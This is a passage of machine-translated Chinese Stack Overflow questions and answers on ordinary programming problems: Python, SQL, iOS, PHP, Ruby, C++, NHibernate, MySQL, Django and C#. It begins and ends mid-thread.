谢谢阅读

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:13:57.980

Criteria.where("field").regex(pattern) 应该可以工作

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-18T14:42:35.080

由于我没有添加评论的能力...

如果您对 Criteria 进行静态导入，它将使您的 where 子句看起来更好。

Criteria orAddress = new Criteria().orOperator(where("addresses.city").is(null), where("addresses.city").regex(city, "i"));

# python - Unittest：断言正确的 SystemExit 代码

> ID：13491724
> 
> 赞同：6
> 
> 时间：2012-11-21T10:55:29.713
> 
> 标签：python, unit-testing

我正在使用[unittest](http://docs.python.org/3.3/library/unittest.html "单元测试")来断言我的脚本引发了正确的`SystemExit`代码。

基于来自[http://docs.python.org/3.3/library/unittest.html#unittest.TestCase.assertRaises的示例](http://docs.python.org/3.3/library/unittest.html#unittest.TestCase.assertRaises)

```
with self.assertRaises(SomeException) as cm:
    do_something()

the_exception = cm.exception
self.assertEqual(the_exception.error_code, 3) 
```

我编码了这个：

```
with self.assertRaises(SystemExit) as cm:
    do_something()

the_exception = cm.exception
self.assertEqual(the_exception.error_code, 3) 
```

但是，这不起作用。出现以下**错误**：

```
AttributeError: 'SystemExit' object has no attribute 'error_code' 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-21T10:55:29.713

[SystemExit](http://docs.python.org/2/library/exceptions.html#exceptions.SystemExit)直接派生自 BaseException 而不是 StandardError，因此它没有属性`error_code`。

而不是`error_code`你必须使用属性`code`。该示例如下所示：

```
with self.assertRaises(SystemExit) as cm:
    do_something()

the_exception = cm.exception
self.assertEqual(the_exception.code, 3) 
```

# sql - SQL 递归：从子状态中获取主状态

> ID：13491725
> 
> 赞同：0
> 
> 时间：2012-11-21T10:55:30.597
> 
> 标签：sql, sql-server, recursion

我发现了这个带有 CTE 的 SQL 递归的好例子，但未能将它应用到我的表中：

*   [http://walkingoncoals.blogspot.de/2009/12/fun-with-recursive-sql-part-1.html](http://walkingoncoals.blogspot.de/2009/12/fun-with-recursive-sql-part-1.html)

我有下表（ObjectStates）：

```
ID    Title    ParentID
1     Draft    null
2     Green    null
3     Red      null
4     Foo      1
5     Bar      4 
```

我正在尝试创建一个在查询时返回“主要”状态的函数。例子：

```
GetMainState(5)
-- Shall return 1
GetMainState(4)
-- Shall return 1
GetMainState(2)
-- Shall return 2 
```

我到目前为止：

```
CREATE FUNCTION [dbo].[GetMainObjectState] (@ObjectStateID INT)
RETURNS TABLE
AS
RETURN 
(
 WITH StateRecurcsion(ID, ParentID, Level) AS
       (
           SELECT ID, ParentID, 0
           FROM ObjectStates
           WHERE ID = @ObjectStateID
           UNION ALL
           SELECT uOS.ID, uOS.ParentID, sOS.Level+1
           FROM ObjectStates uOS, StateRecurcsion sOS
           WHERE uOS.ParentID= sOS.ID
       )
 SELECT os.ID, os.Title, sos.Level
 FROM ObjectStates os, StateRecurcsion sos
 WHERE os.ID = sos.ID
)
GO 
```

我尝试按照上面显示的教程创建函数，但不知何故我没有得到正确的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:32:03.477

您可以创建一个包含“根”值的 CTE，然后在您的函数中查询它，例如：

```
;WITH CTEHierarchy
AS (
    SELECT 
    ID
        ,0 AS LEVEL
        ,ID AS root

    FROM ObjectStates
    WHERE  ParentID IS NULL

    UNION ALL

    SELECT 
    ObjectStates.ID
        ,LEVEL + 1 AS LEVEL
        ,[root]

    FROM ObjectStates
    INNER JOIN CTEHierarchy uh ON uh.id = ObjectStates.ParentID
    )    
    SELECT [root]
    FROM CTEHierarchy
    WHERE ID = @ObjectStateID 
```

# ios - 为什么表格视图不显示 iphone 中的任何数据

> ID：13491727
> 
> 赞同：1
> 
> 时间：2012-11-21T10:55:40.523
> 
> 标签：ios, iphone, objective-c, uitableview

解析本地 XML 文件时，我可以使用 NSLog 在控制台中查看数据。在模拟器中，我只获得了没有从 xml 解析的任何数据的普通表视图。我不明白我在哪里错过它。

![故事板](../Images/9761ebfe3152b500e4f377ecd206aa0e.png)

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath: (NSIndexPath *)indexPath   
{
     static NSString *CellIdentifier = @"Cell";
     UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier: CellIdentifier];     
     if(cell == nil){    
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault   reuseIdentifier:CellIdentifier];      

    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;  
    }  

    theLists = [app.listArray objectAtIndex:indexPath.row];
    cell.textLabel.text = theLists.title;  
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    return cell;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:17:44.793

我认为您没有重新加载表格视图。完成解析后，只需重新加载表格视图。

[重新加载表名]；

然后检查您的表视图委托是否在此方法之后调用。我想这会对你有所帮助。

快乐编码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T12:10:09.890

看来您正在在 DidLoad 中重新加载。但是在解析并从 xml 获取数据之后，您必须使用 TableView 重新加载该数据。

```
[yourtableView reloadData]; 
```

在做之前，确保你已经设置了 Delegate 和 DataSource。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T12:21:03.580

我认为有两个预期的原因：

1- 可能是节数和行数没有设置正确的值。

2-可能是您需要重新加载表格视图数据。

请检查这两种方法：

```
 - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{

return 5; // or any number you want

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T13:00:44.683

我终于得到了答案，我没有正确地将 tableview 控制器类与相应的控制器连接起来。我按照链接[麻烦与故事板建立联系](https://stackoverflow.com/questions/10017767/trouble-making-connections-with-storyboard)

最后它在表格视图中显示了数据。希望这个答案可以帮助其他人。感谢所有在这篇文章中提出建议的人。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-10-27T20:04:38.080

如果您在数据未显示或加载时遇到问题，我想我应该添加这个。

确保您的 tableview 委托和数据源设置为 self。

所以在 viewcontroller 的 viewDidLoad() 函数中，确保添加

```
tableView.delegate = self
tableView.dataSource = self 
```

# php - PHP $_GET with value = "http://abc.com" 导致权限被拒绝

> ID：13491728
> 
> 赞同：2
> 
> 时间：2012-11-21T10:55:45.990
> 
> 标签：php

> **可能重复：**
> [发送 GET 数据时出现 403 禁止错误](https://stackoverflow.com/questions/4951011/403-forbidden-error-while-sending-get-data)

当 $_GET 变量包含值“ [http://abc.com](http://abc.com) ”时，页面返回“禁止访问。您无权访问此服务器上的 /get.php。”

[您可以在http://softwareholic.com/get.php](http://softwareholic.com/get.php)尝试一下（使用 var_dump($_GET); 输出）

这些没问题

```
softwareholic.com/get.php?link=123 //output: array(1) { ["link"]=> string(3) "123" } 
softwareholic.com/get.php?link=http:// //output: array(1) { ["link"]=> string(7) "http://" } 
```

这些会失败

```
softwareholic.com/get.php?link=http://google.com  
softwareholic.com/get.php?link=http%3A%2F%2Fgoogle.com 
```

问题是他们在我的本地主机和 Downtownhost.com 上工作。该问题仅出现在 hostgator.com 上。我还删除了 .htaccess 以缩小范围。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:06:50.420

您的主机正在执行`403`安全措施，可能是为了防止[Open Redirect](https://www.owasp.org/index.php/Open_redirect)漏洞。

你真的需要用户重定向到任何给定的 URL 吗？如何将可能的 URL 存储在数据库表中，并在查询字符串中传递 ID，然后查找和重定向。

# python - Numpy保存文件比原始文件大

> ID：13491731
> 
> 赞同：0
> 
> 时间：2012-11-21T10:55:56.820
> 
> 标签：python, numpy

我正在提取一个使用 R 和 Python 生成的大型 CSV 文件（200Mb）（我是使用 Python 的那个）。

我对文件进行了一些处理（标准化、缩放、删除垃圾列等），然后使用 numpy 的 savetxt 将其再次保存，数据分隔符为“，”以保留 csv 属性。

问题是，新文件几乎是原始文件的两倍（几乎 400Mb）。原始数据和新数据只是浮点数组。

如果有帮助，看起来新文件的值非常小，需要指数值，而原始文件没有。

知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:07:30.663

您是否看过前后浮动在文本中的表示方式？您可能有一行“1.,2.,3”。变为 "1.000000e+0, 2.000000e+0,3.000000e+0" 或类似的东西，两者都是有效的并且都代表相同的数字。

然而，更有可能的是，如果原始文件包含作为有效数字相对较少的值的浮点数（例如“1.1、2.2、3.3”），那么在您进行标准化和缩放之后，您“创建”更多需要表示的数字您的数学结果但不对应于精度的实际增加（例如，在上一个示例中将值的总和标准化为 1.0 给出“0.1666666, 0.3333333, 0.5”）。

我想简短的回答是，不能保证（也没有要求）表示为文本的浮点数占用任何特定数量的存储空间，或者小于每个浮点数可能的最大值；即使数据保持不变，它也会有很大的不同，如果数据发生变化，它肯定会有所不同。

# ruby - 使用 Sinatra 1.3 发送二进制流

> ID：13491734
> 
> 赞同：3
> 
> 时间：2012-11-21T10:56:09.923
> 
> 标签：ruby, sinatra

我正在构建一个 Sinatra 应用程序，该应用程序需要将文件发送给它刚刚从其他地方（本质上是代理）下载的用户。

虽然我有大部分工作，但我无法让 Sinatra 发送代码中指定的正确文件名。我正在使用的代码是：

```
get '/' do
  attachment file.name
  headers['Content-Type'] = file.content_type
  headers['Content-Disposition'] = 'attachment'
  file.body
end 
```

（`file.body`是文件的内容）

如何让 Sinatra 使用我想要的文件名？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T12:05:45.163

```
headers["Content-Disposition"] = "attachment;filename=the_file.txt" 
```

# windows-phone-7 - 如何在 WP8 上包含 Microsoft.Phone.Controls.LongListSelector？

> ID：13491735
> 
> 赞同：0
> 
> 时间：2012-11-21T10:56:12.377
> 
> 标签：windows-phone-7, silverlight-5.0, silverlight-toolkit

当我在 WP8 上运行它时，我在 WP7 上有应用程序失败

*类型“Microsoft.Phone.Controls.LongListSelector”同时存在于“e:.......\lib\Microsoft.Phone.Controls.Toolkit.dll”和“ c:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\WindowsPhone\v8.0\Microsoft.Phone.dll'*

我设置的Windows Phone Toolkit。谁能知道如何解决这个错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T12:58:47.537

您应该使用[Windows Phone 工具包](http://phone.codeplex.com/releases/view/96743)。它已被重构（删除了 LongListSelector 等）以与 WP8 SDK 一起使用。更新工具包并尝试使用 SDK 中的内置 LongListSelector。

# android - Tapit 通过 android 中的 adMob 集成

> ID：13491739
> 
> 赞同：1
> 
> 时间：2012-11-21T10:56:36.007
> 
> 标签：android, ads

我们正在开发一个使用 admob 进行广告的应用程序。

现在我们想通过adMob集成tapit sdk。我从这里下载了源代码

[https://github.com/tapit/TapIt-Android-SDK-Source](https://github.com/tapit/TapIt-Android-SDK-Source)

但我没有成功整合全屏广告、广告提醒。

我进行了很多搜索，但没有找到任何合适的文档或教程来集成它。

所以帮我整合一下。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T12:55:18.990

首先，您想从以下位置构建您的区域 ID 和中介 ID：

```
http://tapit.com/google 
```

然后在您的项目 xml 文件中添加 Tapit 视图

```
<com.tapit.adview.AdView
        android:id="@+id/bannerAd"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/googLayout"
        android:layout_marginTop="23dp"
        zone="" /> 
```

然后在 java 代码活动中，您需要声明所有区域 id 并实现以下方法。

```
public final static String BANNER_ZONE_ID = "7979";
    public final static String VIDEO_ZONE_ID = "7981";
    public final static String MED_RECT_ZONE_ID = "7982";
    public final static String INTRS_ZONE_ID = "7983";
    public final static String ADPROMPT_ZONE_ID = "7984"; 
```

//对于横幅

```
private void setupBannerAd(){
        bannerAd = (AdView)findViewById(R.id.bannerAd);
        bannerAd.setBackgroundColor(0);

        // the remainder of this method is optional...

//        Map<String, String> params = new HashMap<String, String>();
//        params.put("mode", "test");
//        bannerAd.setCustomParameters(params);

        // if you're interested in being updated with banner ad lifecycle events, register a listener
        bannerAd.setOnAdDownload(new OnAdDownload() {
            @Override
            public void begin(AdViewCore adView){
                // Called just before an ad request is made
                Log.d("TapItTest", "Requesting banner ad");
                Toast.makeText(getApplicationContext(), "Requesting banner ad", Toast.LENGTH_SHORT).show();
                bannerAd.setBackgroundColor(0);
            }

            @Override
            public void end(AdViewCore adView){
                // Called after an ad is successfully loaded... show ad
                Log.d("TapItTest", "Banner ad successfully loaded");
                Toast.makeText(getApplicationContext(), "Banner ad successfully loaded", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void error(AdViewCore adView, String error){
                // Called when bannerAd fails to load an ad... hide ad
                Toast.makeText(getApplicationContext(), "Failed to load banner: " + error, Toast.LENGTH_LONG).show();
                Log.d("TapItTest", "Banner ad failed to load: " + error);
            }

            @Override
            public void clicked(AdViewCore adView){
                Log.d("TapItTest", "Ad clicked");
                Toast.makeText(getApplicationContext(), "Ad clicked", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void willPresentFullScreen(AdViewCore adView){
                Log.d("TapItTest", "willPresentFullScreen");
                Toast.makeText(getApplicationContext(), "willPresentFullScreen", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void didPresentFullScreen(AdViewCore adView){
                Log.d("TapItTest", "didPresentFullScreen");
                Toast.makeText(getApplicationContext(), "didPresentFullScreen", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void willDismissFullScreen(AdViewCore adView){
                Log.d("TapItTest", "willDismissFullScreen");
                Toast.makeText(getApplicationContext(), "willDismissFullScreen", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void willLeaveApplication(AdViewCore adView){
                Log.d("TapItTest", "Leaving Application!");
                Toast.makeText(getApplicationContext(), "Leaving Application!", Toast.LENGTH_SHORT).show();
            }
        });
    } 
```

//用于提示

```
 /**
     * AdPrompt init code with anonymous listener
     */
    public void initAdPrompt() {
        adPrompt = new AdPrompt(this, ADPROMPT_ZONE_ID);

        // the remainder of this method is optional...

        // send optional params to the AdPrompt
//        Map<String, String> params = new HashMap<String, String>();
//        params.put("mode", "test");
//        adPrompt.setCustomParameters(params);

        // if you're interested in being updated with AdPrompt lifecycle events, register a listener
        adPrompt.setListener(new AdPrompt.AdPromptCallbackListener() {

            @Override
            public void adPromptError(AdPrompt adPrompt, String error){
                Log.d("TapItTest", "AdPrompt failed to load: " + error);
                Toast.makeText(getApplicationContext(), "AdPrompt failed to load: " + error, Toast.LENGTH_LONG).show();
                MainActivity.this.adPrompt = null;
            }

            @Override
            public void adPromptLoaded(AdPrompt adPrompt){
                Log.d("TapItTest", "AdPrompt loaded");
                Toast.makeText(getApplicationContext(), "AdPrompt loaded", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void adPromptDisplayed(AdPrompt adPrompt){
                Log.d("TapItTest", "AdPrompt has been shown");
            }

            @Override
            public void adPromptClosed(AdPrompt adPrompt, boolean didAccept){
                Log.d("TapItTest", "AdPrompt was closed using the " + (didAccept ? "CallToAction" : "Decline") + " button");
                MainActivity.this.adPrompt = null;
            }
        });
    }

//adprompt
    /**
     * Pre-load the AdPrompt... We'll show it later
     */
    public void preloadAdPrompt() {
        Log.d("TapItTest", "Loading AdPrompt");
        initAdPrompt();
        adPrompt.load();
    }

    /**
     * Show the AdPrompt.  If it hasn't been pre-loaded, init before showing
     */
    public void fireAdPrompt() {
        Log.d("TapItTest", "showing AdPrompt");
        if(adPrompt == null) {
            // AdPrompt wasn't pre-loaded.  We'll instantiate and show at the same time...
            initAdPrompt();
        }
        adPrompt.showAdPrompt();
    } 
```

//用于加载插页式广告

```
 /**
     * Load up an interstitial with listener example
     */
    public void preloadInterstitial() {
        interstitialAd = new AdInterstitialView(this, INTRS_ZONE_ID);

        // Optionally specify custom params
        // un-comment to enable test mode
//        Map<String, String> params = new HashMap<String, String>();
//        params.put("mode", "test");
//        interstitialAd.setCustomParameters(params);

        // Optionally register a listener to get ad lifecycle notifications.
        interstitialAd.setOnInterstitialAdDownload(new OnInterstitialAdDownload() {
            @Override
            public void willLoad(AdViewCore adView){
                // interstitial is about to load
                Log.d("TapItTest", "WillLoad");
                Toast.makeText(getApplicationContext(), "WillLoad", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void ready(AdViewCore adView){
                // interstitial is loaded and ready for display
                Log.d("TapItTest", "ready!");
                showButton.setEnabled(true);
                Toast.makeText(getApplicationContext(), "ready!", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void willOpen(AdViewCore adView){
                // interstitial is about to cover the screen. minimize your app footprint
                Log.d("TapItTest", "WillOpen");
                Toast.makeText(getApplicationContext(), "WillOpen", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void didClose(AdViewCore adView){
                // interstitial is no longer covering the screen
                Log.d("TapItTest", "didClose");
                Toast.makeText(getApplicationContext(), "didClose", Toast.LENGTH_SHORT).show();
                destroyInterstitial();

                loadButton.setEnabled(true);
                showButton.setEnabled(false);
            }

            @Override
            public void error(AdViewCore adView, String error){
                Log.d("TapItTest", "Failed to load interstitial: " + error);
                Toast.makeText(getApplicationContext(), "Failed to load interstitial: " + error, Toast.LENGTH_LONG).show();

                showButton.setEnabled(false);
                loadButton.setEnabled(true);
            }

            @Override
            public void clicked(AdViewCore adView){
                Log.d("TapItTest", "Ad clicked");
                Toast.makeText(getApplicationContext(), "Ad clicked", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void willLeaveApplication(AdViewCore adView){
                Log.d("TapItTest", "Leaving Application!");
                Toast.makeText(getApplicationContext(), "Leaving Application!", Toast.LENGTH_SHORT).show();
            }
        });

        // fire off the ad request.
        interstitialAd.load();
    }

    /**
     * Wire up the buttons...
     */
    public void setupButtons() {
        loadButton = (Button)findViewById(R.id.loadInterstitialButton);
        loadButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View button){
                preloadInterstitial();
                loadButton.setEnabled(false);
            }
        });
        showButton = (Button)findViewById(R.id.showInterstitialButton);
        showButton.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View button) {
                interstitialAd.showInterstitial();
            }
        });
        showButton.setEnabled(false);

        final MainActivity me = this;
        ((Button)findViewById(R.id.loadAdPromptButton)).setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view){
                me.preloadAdPrompt();
            }
        });

        ((Button)findViewById(R.id.showAdPromptButton)).setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v){
                me.fireAdPrompt();
            }
        });

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T04:38:40.280

对于 Tapit，您需要在**Android-mainfest.xml**文件中添加以下权限

-->

和两个活动

```
<activity
            android:name="com.tapit.adview.AdActivity"
            android:configChanges="keyboard|keyboardHidden|orientation" />
        <activity
            android:name="com.google.ads.AdActivity"
            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize" /> 
```

# c++ - 来自模板类的模板参数的 typedef 是不可见的

> ID：13491741
> 
> 赞同：2
> 
> 时间：2012-11-21T10:56:35.310
> 
> 标签：c++, templates, inheritance, typedef

给定一个基类，它包含公共静态方法以及所有派生类的一般逻辑（例如创建它们）。子类模板的参数化类型被传递给基类模板（连同子类的类型，以便在基类的静态方法中访问其自定义静态方法）。这些类型的组合是类型定义的新“类型”（这是在基类中完成的，以避免重复某些代码）。然后他们在派生类的公共部分重新定义（类似）。我会在包含助手的类中使用这些类型定义，如下所示：

```
#include <iostream>
#include <vector>

#include <cmath>
#include <cstdlib>

template< class DERIVED >
class HELPERS;

template< class V, class DERIVED >
struct BASE
{

    typedef typename V::value_type F;

    static
    F some_common_operation()
    {
        return helpers.approximate_x(DERIVED::value()); // some common logic (HELPERS::approximate_x() here) depending on the value of DERIVED::value()
    }

    static
    DERIVED create_biased(F const & x)
    {
        return DERIVED(F(0.5) * (x + some_common_operation()));
    }

protected :

    BASE(F const & x_)
        : x(x_)
    { ; }

    F x;

private :

    static
    HELPERS< DERIVED > const helpers;

};

template< class V, class DERIVED >
HELPERS< DERIVED > const BASE< V, DERIVED >::helpers;

template< class V >
class DERIVED
    : public BASE< V, DERIVED< V > >
{

    typedef BASE< V, DERIVED< V > > B;
    friend B;

public :

    typedef typename B::F F;

    DERIVED(F const & x_)
        : B(x_)
    { ; }

    F shape(F const & y) const
    {
        return y * x;
    }

private :

    static constexpr
    F value()
    {
        return F(2.0L); // custom data
    }

    using B::x;

};

// template< class > class DERIVED1;...

template< class D >
struct HELPERS // set of helpers, that operates on classes derived from BASE
{

    typedef typename D::F F; // error: no type named <F> in <class DERIVED<std::vector<double> >>

    F approximate_x(F const & x) const
    {
        using std::sqrt;
        return sqrt(x);
    }

};

int main()
{
    DERIVED< std::vector< double > > d(2.0L);
    return EXIT_SUCCESS;
} 
```

我正在尝试在 helpers 类中获取定义，但出现错误（*g++ -std=gnu++11 a.cpp*）。

`a.cpp: In instantiation of «struct HELPERS<DERIVED<std::vector<double> > >»: a.cpp:44:26: required from «struct BASE<std::vector<double>, DERIVED<std::vector<double> > >» a.cpp:47:7: required from «class DERIVED<std::vector<double> >» a.cpp:97:39: required from here a.cpp:85:27: error: no type named «F» in «class DERIVED<std::vector<double> >»`

怎么了？Typedef 及其所有“祖先”都可以在类链中访问（放置在公共部分中）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:23:24.477

这是一个鸡蛋问题。

发生这种情况是因为在您定义`BASE`,时`DERIVED`尚未完全定义（因为编译器需要先解析基类）。因此，您无法访问`DERIVED` in 的任何 typedef `HELPER`。为确保您可以检查以下是否正常工作：

```
template< class V, class DERIVED >
struct BASE
{
    typedef typename V::value_type F;
    typedef typename DERIVED::F G; // <-- error here
    ...
} 
```

您可以尝试的是移动`HELPER`to的使用`DERIVED`，或 `V`用作 的参数`HELPER`。

# hibernate - NHibernate 中的继承和延迟加载

> ID：13491749
> 
> 赞同：0
> 
> 时间：2012-11-21T10:57:06.893
> 
> 标签：hibernate, nhibernate, inheritance, lazy-loading

参加以下课程：

```
public class Employee 
{ 
    public Employee Manager { get; set; }
}

public class ShopFloorEmployee : Employee { ... }

public class OfficeEmployee : Employee { ... }

public class Department 
{
    public Employee Manager { get; set; }
} 
```

这里是 NHibernate 映射文件：

```
 <?xml version="1.0" encoding="utf-8" ?>
  <hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" 
                     namespace="Domain.Entities" 
                     assembly="Domain">
    <class name="Employee">
      <id name="Id" column="Id" type="long">
        <generator class="identity"/>
      </id>
      <discriminator column="Type" type="string"/>
      <many-to-one name="Manager" class="Employee" column="ManagerId" lazy="proxy" />

      <subclass name="ShopFloorEmployee" discriminator-value="ShopFloorEmployee" extends="Employee"/>
      </subclass>

      <subclass name="OfficeEmployee" discriminator-value="OfficeEmployee" extends="Employee"/>
      </subclass>

    </class>
  </hibernate-mapping>

  <?xml version="1.0" encoding="utf-8" ?>
  <hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" 
                     namespace="Domain.Entities" 
                     assembly="Domain">
    <class name="Department">
      <id name="Id" column="Id" type="long">
        <generator class="identity"/>
      </id>
      <discriminator column="Type" type="string"/>
      <many-to-one name="Manager" class="Employee" column="ManagerId" lazy="proxy" />
    </class>
  </hibernate-mapping> 
```

这些代理似乎给我带来了问题。例如，如果我加载一个部门，该部门的经理（我们称他为 Bob，他是 ShopFloorEmployee）的类型将是 EmployeeProxy。然后，在同一个会话中，如果我专门加载所有 ShopFloorEmployees 的列表，那么除了 Bob 之外，它们都是 ShopFloorEmployee 类型，他的类型是 EmployeeProxy。然后我根本无法将 Bob 转换为 ShopFloorEmployee，因为它遵循了不同的继承路径。

每次我加载部门或员工时，代理都需要避免通过他们的经理递归加载员工负载。

我在这里做一些根本错误的事情，还是这是 NHibernate 的一个怪癖？如果这是一个怪癖，那么是否有解决方法？我曾考虑在加载部门后明确关闭会话，但这似乎太老套了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T15:45:23.327

此问题的常见解决方法是添加一个`Self`属性以访问非代理类型：

```
public virtual Employee Self
{
   get { return this; }
} 
```

然后你可以检查`Bob.Self is ShopFloorEmployee`。

就我个人而言，我非常谨慎地使用继承，我会在这里使用“角色”属性而不是子类化。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T11:36:47.657

这是一个常见的[NHibernate 陷阱](http://weblogs.asp.net/ricardoperes/archive/2012/08/02/nhibernate-pitfalls-inheritance-and-proxies.aspx)。尝试更改对[No proxy association](http://ayende.com/blog/4378/nhibernate-new-feature-no-proxy-associations)`Manager`的引用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T17:13:00.107

我有一个类似的问题，请参见此处： [流利的休眠多态性。如何检查类的类型](https://stackoverflow.com/questions/13484939/fluent-nhibernate-polymorphism-how-to-check-for-type-of-class/13543390#13543390)

我选择使用基于访客模式的解决方案

你不需要关闭延迟加载，也不需要使用有趣的属性来返回 self 对象

# mysql - 使用高达 95% 的 CPU 的持久 MySQL 进程

> ID：13491751
> 
> 赞同：0
> 
> 时间：2012-11-21T10:57:17.530
> 
> 标签：mysql, performance, cron, cpu-usage

我真的是服务器端的新手，我一直在为我的网站管理一个专用服务器。

在高峰时间网站非常慢，为了知道为什么我一直在使用 htop 监控它。

一些真正持久（超过几个小时）的 mysql 进程使用高达 95% 的 CPU ！

问题是我不知道什么查询可能是它的原因，也不知道如何监控它。我确实每一刻钟都有一个 cron，有时需要很长时间才能运行，但减速的时间并不总是与 cron 相匹配。

我听说过使用 cron 作业杀死太长的 mysql 进程的解决方案，但它不会导致数据库中的差异吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:07:54.393

配置 MySQL 服务器以[记录慢查询](http://dev.mysql.com/doc/refman/5.1/en/slow-query-log.html)，然后查看它们。您需要了解为什么这些查询如此缓慢。

最有可能的是，这些查询可以通过添加适当的索引来加速，但这不是快速和硬性的规则——你需要了解真正发生的事情。

您可以终止长时间运行的查询，但如果您有 MyISAM 引擎，它可能会损坏您的表。在这种情况下，请认真考虑切换到 Innodb 引擎。使用像 Innodb 这样的事务引擎，当前正在运行的事务可能会被回滚，但数据不应该被破坏。

# python - 测试 InlineFormset 清理方法

> ID：13491756
> 
> 赞同：9
> 
> 时间：2012-11-21T10:57:25.350
> 
> 标签：python, django, django-forms, inline-formset

我有一个 Django 项目，有 2 个模型，a`Structure`和`Bracket`，括号有一个结构的外键（即一对多，一个结构有很多括号）。我为管理站点创建了一个`TabularInline`，这样结构上就会有一个括号表。我添加了一个带有一些自定义`clean`方法的自定义表单集来进行一些额外的验证，你不能有一个与同一结构上的另一个括号冲突的括号等。

管理员看起来像这样：

```
class BracketInline(admin.TabularInline):
    model = Bracket
    formset = BracketInlineFormset

class StructureAdmin(admin.ModelAdmin):
    inlines = [
        BracketInline
    ]
admin.site.register(Structure, StructureAdmin) 
```

`BracketInlineFormset`刚刚有 clean 方法：

```
class BracketInlineFormset(forms.models.BaseInlineFormSet):
    def clean(self):
        … my clean code here … 
```

这一切都有效，并且验证有效。

但是现在我想编写一些单元测试来测试我复杂的表单集验证逻辑。

我第一次尝试验证已知良好的值是：

```
data = {'form-TOTAL_FORMS': '1', 'form-INITIAL_FORMS': '0', 'form-MAX_NUM_FORMS': '', 'form-0-field1':'good-value', … }
formset = BracketInlineFormset(data)
self.assertTrue(formset.is_valid()) 
```

但是，这不起作用并引发异常：

```
======================================================================
ERROR: testValid (appname.tests.StructureTestCase)
----------------------------------------------------------------------
Traceback (most recent call last):
  File "/paht/to/project/tests.py", line 494, in testValid
    formset = BracketInlineFormset(data)
  File "/path/to/django/forms/models.py", line 672, in __init__
    self.instance = self.fk.rel.to()
AttributeError: 'BracketInlineFormset' object has no attribute 'fk'

---------------------------------------------------------------------- 
```

[Django 文档](https://docs.djangoproject.com/en/1.3/topics/forms/formsets/#custom-formset-validation)（用于表单集验证）暗示可以做到这一点。

这怎么行不通？如何测试我的内联表单集的自定义 clean()/validation？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-04T05:49:07.260

您可以使用 django.forms.models 中的 inlineformset_factory 方法来创建自定义的内联表单集。此方法根据传递给它的父类将 fk 值设置为您的表单集。

```
structure = StructureFactory() #foreign key
data = {'form-TOTAL_FORMS': '1', 'form-INITIAL_FORMS': '0', 'form-MAX_NUM_FORMS': '', 'form-0-field1':'good-value', … }
BIFormset = inlineformset_factory(Structure, Bracket, formset=BracketInlineFormset)
formset = BIFormset(data, prefix='form', instance=structure) 
self.assertTrue(formset.is_valid()) 
```

`formset=BracketInlineFormset`用工厂构造表单集时注意参数。

参考：[Django 文档](https://docs.djangoproject.com/en/dev/ref/forms/models/#django.forms.models.inlineformset_factory)

# c# - C#中的空指针异常

> ID：13491758
> 
> 赞同：4
> 
> 时间：2012-11-21T10:57:32.057
> 
> 标签：c#, c#-4.0, asynchronous

我在下面的代码中面临 NullPointerException，因为它很少发生，我尝试调试以复制该问题但没有运气。任何人都可以帮助我这里可能导致 NullPointerException 的原因。

```
private static void MyTaskCompletedCallback(IAsyncResult res)
    {
        var worker = (AsyncErrorDelegate)((AsyncResult)res).AsyncDelegate;
        var async = (AsyncOperation)res.AsyncState;
        worker.EndInvoke(res);
        lock (IsAsyncOpOccuring)
        {
            IsBusy = false;
        }
        var completedArgs = new AsyncCompletedEventArgs(null, false, null);
        async.PostOperationCompleted(e => OnTaskCompleted((AsyncCompletedEventArgs)e), completedArgs);
    } 
```

在 var async = (AsyncOperation)res.AsyncState; 处报告空指针异常；

我调用它的代码

```
 var context = HttpContext.Current;
